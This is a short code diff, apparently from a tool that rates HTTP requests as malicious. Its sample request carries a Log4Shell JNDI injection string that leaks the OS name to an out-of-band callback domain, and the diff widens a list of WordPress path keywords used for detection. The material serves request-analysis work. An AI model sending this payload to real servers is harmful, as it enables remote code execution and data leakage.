@@ -10,6 +10,6 @@ instance = httpanalyzer.Request(
      'User-Agent': 'curl/7.82.0'},
     '159.223.205.51',
     '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
-    ['wp-content', 'wp-config', 'wp-includes']
+    ['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']
 )
 print(f"Malicious rating: {instance.malicious() * 100}%")
